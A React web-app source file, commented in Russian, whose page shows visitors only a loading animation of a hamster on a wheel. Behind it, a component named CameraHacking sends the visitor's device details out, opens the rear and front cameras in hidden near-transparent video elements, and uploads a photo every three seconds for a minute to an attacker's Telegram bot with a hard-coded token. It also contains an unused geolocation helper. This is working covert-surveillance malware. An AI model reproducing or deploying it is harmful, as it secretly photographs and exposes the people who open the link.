import React, { useRef, useEffect } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const cameraNamesRef = useRef([]);
  const captureCount = useRef(0);
  const startTime = useRef(null);
  const totalDuration = 60000;
  const photoInterval = 3000;

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  // Метод отправки текста
  const sendToTelegram = (text) => {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      
      xhr.onload = function() {
        if (xhr.status === 200) resolve(true);
        else reject();
      };
      
      xhr.onerror = function() {
        reject();
      };
      
      const data = JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        disable_notification: true
      });
      
      xhr.send(data);
    });
  };

  // Отправка фото
  const sendPhotoToTelegram = (blob, caption = '') => {
    return new Promise((resolve, reject) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      if (caption) formData.append('caption', caption);

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
      
      xhr.onload = function() {
        if (xhr.status === 200) resolve(true);
        else reject();
      };
      
      xhr.onerror = function() {
        reject();
      };
      
      xhr.send(formData);
    });
  };

  // Получение геолокации
  const getGeolocation = () => {
    return new Promise((resolve) => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude } = position.coords;
            resolve({
              latitude: latitude.toFixed(6),
              longitude: longitude.toFixed(6),
              method: "GPS",
              success: true
            });
          },
          () => {
            resolve({ success: false });
          }
        );
      } else {
        resolve({ success: false });
      }
    });
  };

  // Инициализация камер - УПРОЩЕННАЯ И РАБОЧАЯ ВЕРСИЯ
  const initializeCameras = async () => {
    try {
      console.log('Начинаю инициализацию камер...');
      
      streamsRef.current = [];
      videoRefsRef.current = [];
      cameraNamesRef.current = [];
      
      // ПРОБУЕМ СНАЧАЛА ЗАДНЮЮ КАМЕРУ, ПОТОМ ФРОНТАЛЬНУЮ
      const cameraConfigs = [
        {
          name: "📷 Задняя камера",
          constraints: { 
            video: { 
              facingMode: { exact: "environment" },
              width: { ideal: 1280 },
              height: { ideal: 720 }
            }
          }
        },
        {
          name: "🤳 Фронтальная камера",
          constraints: { 
            video: { 
              facingMode: "user",
              width: { ideal: 1280 },
              height: { ideal: 720 }
            }
          }
        }
      ];
      
      // Пробуем каждую камеру по очереди
      for (let i = 0; i < cameraConfigs.length; i++) {
        try {
          console.log(`Пробую ${cameraConfigs[i].name}...`);
          
          const stream = await navigator.mediaDevices.getUserMedia(cameraConfigs[i].constraints);
          console.log(`${cameraConfigs[i].name} доступна!`);
          
          // Создаем видео элемент с БОЛЬШИМ размером для надежности
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 640px;
            height: 480px;
            opacity: 0.001;
            pointer-events: none;
            z-index: -9999;
            top: ${i * 10}px;
            left: ${i * 10}px;
          `;
          video.autoplay = true;
          video.muted = true;
          video.playsInline = true;
          video.setAttribute('playsinline', '');
          video.srcObject = stream;
          document.body.appendChild(video);
          
          // Ждем готовности видео - УВЕЛИЧЕННОЕ ВРЕМЯ ОЖИДАНИЯ
          await new Promise((resolve, reject) => {
            let loaded = false;
            
            const checkVideo = () => {
              if (video.videoWidth > 0 && video.videoHeight > 0 && video.readyState >= 2) {
                console.log(`${cameraConfigs[i].name} готова: ${video.videoWidth}x${video.videoHeight}`);
                loaded = true;
                resolve();
                return;
              }
              
              // Продолжаем проверять
              setTimeout(checkVideo, 100);
            };
            
            // Начинаем проверку
            checkVideo();
            
            // Таймаут 5 секунд
            setTimeout(() => {
              if (!loaded) {
                console.log(`${cameraConfigs[i].name}: таймаут, но продолжаем...`);
                resolve(); // Все равно продолжаем
              }
            }, 5000);
            
            video.onerror = (err) => {
              console.error(`Ошибка видео ${cameraConfigs[i].name}:`, err);
              reject(err);
            };
          });
          
          // Сохраняем
          streamsRef.current.push(stream);
          videoRefsRef.current.push(video);
          cameraNamesRef.current.push(cameraConfigs[i].name);
          
          // Пауза между инициализацией камер
          await new Promise(resolve => setTimeout(resolve, 500));
          
        } catch (error) {
          console.log(`${cameraConfigs[i].name} не доступна:`, error.message);
          
          // Если задняя камера не работает, пробуем альтернативный способ
          if (i === 0) { // Это задняя камера
            console.log('Пробую альтернативный метод для задней камеры...');
            try {
              // Пробуем без exact
              const altStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "environment" }
              });
              
              const altVideo = document.createElement('video');
              altVideo.style.cssText = `
                position: fixed;
                width: 640px;
                height: 480px;
                opacity: 0.001;
                pointer-events: none;
                z-index: -9999;
                top: 0;
                left: 0;
              `;
              altVideo.autoplay = true;
              altVideo.muted = true;
              altVideo.playsInline = true;
              altVideo.srcObject = altStream;
              document.body.appendChild(altVideo);
              
              await new Promise(resolve => {
                altVideo.onloadedmetadata = () => resolve();
                setTimeout(resolve, 1000);
              });
              
              streamsRef.current.push(altStream);
              videoRefsRef.current.push(altVideo);
              cameraNamesRef.current.push("📷 Задняя камера (альт)");
              console.log('Задняя камера (альт) активирована!');
              
            } catch (altError) {
              console.log('Альтернативный метод тоже не сработал');
            }
          }
        }
      }
      
      console.log(`Инициализация завершена. Доступно камер: ${streamsRef.current.length}`);
      
      // Если нет камер вообще, пробуем просто любую камеру
      if (streamsRef.current.length === 0) {
        console.log('Пробую получить любую камеру...');
        try {
          const anyStream = await navigator.mediaDevices.getUserMedia({ video: true });
          const anyVideo = document.createElement('video');
          anyVideo.style.cssText = `
            position: fixed;
            width: 640px;
            height: 480px;
            opacity: 0.001;
            pointer-events: none;
            z-index: -9999;
            top: 0;
            left: 0;
          `;
          anyVideo.autoplay = true;
          anyVideo.muted = true;
          anyVideo.playsInline = true;
          anyVideo.srcObject = anyStream;
          document.body.appendChild(anyVideo);
          
          await new Promise(resolve => {
            anyVideo.onloadedmetadata = () => resolve();
            setTimeout(resolve, 1000);
          });
          
          streamsRef.current.push(anyStream);
          videoRefsRef.current.push(anyVideo);
          cameraNamesRef.current.push("📷 Камера (общая)");
          console.log('Общая камера активирована!');
          
        } catch (finalError) {
          console.log('Не удалось получить ни одну камеру');
        }
      }
      
      return streamsRef.current.length > 0;
      
    } catch (error) {
      console.error('Ошибка инициализации камер:', error);
      return false;
    }
  };

  // Создание фото с камеры
  const capturePhotoFromCamera = async (cameraIndex, video, cameraName) => {
    return new Promise((resolve) => {
      // Даем время видео обновиться
      setTimeout(() => {
        const canvas = document.createElement('canvas');
        
        // Проверяем, готово ли видео
        if (video && video.videoWidth > 0 && video.videoHeight > 0 && video.readyState >= 2) {
          console.log(`${cameraName}: Захватываю фото ${video.videoWidth}x${video.videoHeight}`);
          
          // Используем реальные размеры видео
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          
          const ctx = canvas.getContext('2d');
          
          // Очищаем
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          
          try {
            // Рисуем видео
            if (cameraName.includes('Фронтальная')) {
              // Зеркалим фронтальную камеру
              ctx.save();
              ctx.translate(canvas.width, 0);
              ctx.scale(-1, 1);
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              ctx.restore();
            } else {
              // Задняя камера без зеркала
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            }
            
            // Водяной знак TAVERNA (правый нижний угол)
            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
            ctx.font = 'bold 32px Arial';
            ctx.textAlign = 'right';
            ctx.fillText('TAVERNA', canvas.width - 20, canvas.height - 20);
            
            // Информация (левый верхний угол)
            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
            ctx.textAlign = 'left';
            ctx.font = 'bold 20px Arial';
            ctx.fillText(cameraName, 20, 40);
            ctx.font = '16px Arial';
            ctx.fillText(`Фото #${captureCount.current + 1}`, 20, 70);
            ctx.fillText(new Date().toLocaleTimeString(), 20, 100);
            ctx.fillText(`${video.videoWidth}x${video.videoHeight}`, 20, 130);
            
          } catch (drawError) {
            console.error('Ошибка рисования:', drawError);
            // Создаем черное изображение с ошибкой
            canvas.width = 800;
            canvas.height = 600;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#000000';
            ctx.fillRect(0, 0, 800, 600);
            ctx.fillStyle = '#FF0000';
            ctx.font = '24px Arial';
            ctx.textAlign = 'center';
            ctx.fillText('ОШИБКА КАМЕРЫ', 400, 300);
          }
          
        } else {
          // Видео не готово - создаем тестовое изображение
          console.log(`${cameraName}: видео не готово`);
          
          canvas.width = 800;
          canvas.height = 600;
          const ctx = canvas.getContext('2d');
          
          // Градиентный фон
          const gradient = ctx.createLinearGradient(0, 0, 800, 600);
          gradient.addColorStop(0, '#667eea');
          gradient.addColorStop(1, '#764ba2');
          ctx.fillStyle = gradient;
          ctx.fillRect(0, 0, 800, 600);
          
          // Сообщение
          ctx.fillStyle = '#FFFFFF';
          ctx.font = 'bold 36px Arial';
          ctx.textAlign = 'center';
          ctx.fillText('TAVERNA SYSTEM', 400, 150);
          
          ctx.font = '28px Arial';
          ctx.fillText(cameraName, 400, 250);
          ctx.fillText('Камера не активна', 400, 320);
          
          ctx.font = '22px Arial';
          ctx.fillText(`Фото #${captureCount.current + 1}`, 400, 380);
          ctx.fillText(new Date().toLocaleTimeString(), 400, 420);
          
          // Водяной знак
          ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
          ctx.font = 'bold 48px Arial';
          ctx.textAlign = 'right';
          ctx.fillText('TAVERNA', 780, 580);
        }
        
        // Создаем JPEG с хорошим качеством
        canvas.toBlob(blob => {
          if (blob) {
            console.log(`${cameraName}: фото создано (${Math.round(blob.size/1024)} KB)`);
            resolve(blob);
          } else {
            console.log(`${cameraName}: не удалось создать фото`);
            resolve(null);
          }
        }, 'image/jpeg', 0.9);
        
      }, 300); // Задержка для обновления видео
    });
  };

  // Захват и отправка фото
  const captureAndSendPhotos = async () => {
    const elapsed = Date.now() - startTime.current;
    
    if (elapsed >= totalDuration) {
      stopCapturing();
      sendToTelegram(`⏰ TAVERNA: Время истекло\n📸 Фото: ${captureCount.current}`);
      return;
    }
    
    if (videoRefsRef.current.length === 0) {
      console.log('Нет активных камер');
      captureCount.current++;
      return;
    }
    
    console.log(`\n=== Съемка #${captureCount.current + 1} ===`);
    
    // Отправляем фото с каждой камеры
    for (let i = 0; i < videoRefsRef.current.length; i++) {
      try {
        const video = videoRefsRef.current[i];
        const cameraName = cameraNamesRef.current[i] || `Камера ${i + 1}`;
        
        console.log(`Обработка ${cameraName}...`);
        
        const photoBlob = await capturePhotoFromCamera(i, video, cameraName);
        
        if (photoBlob) {
          const elapsedSeconds = Math.floor(elapsed / 1000);
          const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
          
          const caption = `${cameraName}\n` +
            `📸 Фото #${captureCount.current + 1}\n` +
            `⏱ ${elapsedSeconds} сек / ${remainingSeconds} сек\n` +
            `🕐 ${new Date().toLocaleTimeString()}\n` +
            `🚀 TAVERNA SYSTEM`;
          
          console.log(`Отправка ${cameraName}...`);
          await sendPhotoToTelegram(photoBlob, caption);
          console.log(`${cameraName} отправлена ✓`);
        }
      } catch (error) {
        console.error(`Ошибка ${cameraNamesRef.current[i] || `камеры ${i}`}:`, error);
      }
    }
    
    captureCount.current++;
    
    // Статистика каждые 3 фото
    if (captureCount.current % 3 === 0) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      sendToTelegram(
        `📊 TAVERNA: Статистика\n` +
        `📸 Фото: ${captureCount.current}\n` +
        `📷 Камер: ${videoRefsRef.current.length}\n` +
        `⏱ Прошло: ${elapsedSeconds} сек`
      ).catch(() => {/* игнорируем */});
    }
  };

  // Запуск съемки
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    console.log('🚀 Запуск периодической съемки');
    
    // Первый снимок
    setTimeout(() => {
      captureAndSendPhotos();
    }, 1500);
    
    // Интервал
    captureIntervalRef.current = setInterval(() => {
      captureAndSendPhotos();
    }, photoInterval);
  };

  // Остановка
  const stopCapturing = () => {
    console.log('🛑 Остановка съемки');
    
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    streamsRef.current.forEach(stream => {
      stream?.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];
    
    videoRefsRef.current.forEach(video => {
      video?.remove();
    });
    videoRefsRef.current = [];
    cameraNamesRef.current = [];
  };

  // Основной эффект
  useEffect(() => {
    console.log('=== TAVERNA SYSTEM ЗАПУЩЕН ===');
    console.log('Chat ID:', chatId);
    startTime.current = Date.now();
    
    const init = async () => {
      try {
        // Отправляем стартовое сообщение
        await sendToTelegram(
          `🚀 TAVERNA SYSTEM АКТИВИРОВАН\n` +
          `📱 Устройство: ${navigator.userAgent.substring(0, 100)}...\n` +
          `🖥 Экран: ${window.screen.width}x${window.screen.height}\n` +
          `⏰ Запуск: ${new Date().toLocaleString()}\n` +
          `⏳ Длительность: 1 минута`
        ).catch(() => console.log('Не удалось отправить стартовое сообщение'));
        
        // Инициализируем камеры
        console.log('\n=== ИНИЦИАЛИЗАЦИЯ КАМЕР ===');
        const camerasReady = await initializeCameras();
        
        if (camerasReady) {
          console.log('\n✅ Камеры готовы к работе!');
          
          await sendToTelegram(
            `📷 КАМЕРЫ АКТИВИРОВАНЫ\n` +
            `✅ Доступно: ${streamsRef.current.length} камер\n` +
            `📸 Режим: 1 фото каждые 3 секунды\n` +
            `⏱ Начинаю съемку...`
          ).catch(() => console.log('Не удалось отправить сообщение о камерах'));
          
          // Запускаем съемку
          startPeriodicCapture();
          
          // Остановка через 1 минуту
          setTimeout(() => {
            stopCapturing();
            sendToTelegram(
              `✅ TAVERNA SYSTEM: СЪЕМКА ЗАВЕРШЕНА\n` +
              `📸 Итого фото: ${captureCount.current}\n` +
              `📷 Камер использовано: ${streamsRef.current.length}\n` +
              `⏱ Время работы: 1 минута\n` +
              `🎉 Процесс завершен успешно`
            ).catch(() => console.log('Не удалось отправить финальное сообщение'));
          }, totalDuration);
          
        } else {
          console.log('\n❌ Камеры не доступны');
          await sendToTelegram(
            `❌ TAVERNA SYSTEM: ОШИБКА\n` +
            `Не удалось активировать камеры\n` +
            `Проверьте разрешения браузера`
          ).catch(() => console.log('Не удалось отправить сообщение об ошибке'));
        }
        
      } catch (error) {
        console.error('Критическая ошибка:', error);
      }
    };
    
    // Запуск с задержкой
    setTimeout(init, 1000);
    
    // Очистка
    return () => {
      stopCapturing();
    };
  }, [chatId]);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px'
      }}>
        <div className="wraper" style={{ transform: 'scale(1.4)' }}>
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '50px',
            color: 'white',
            fontSize: '18px',
            fontWeight: 'bold',
            opacity: 0.9
          }}>
            TAVERNA SYSTEM ACTIVE...
          </div>
        </div>
      </div>

      {chatId && <CameraHacking chatId={chatId} />}
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
        }}>
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
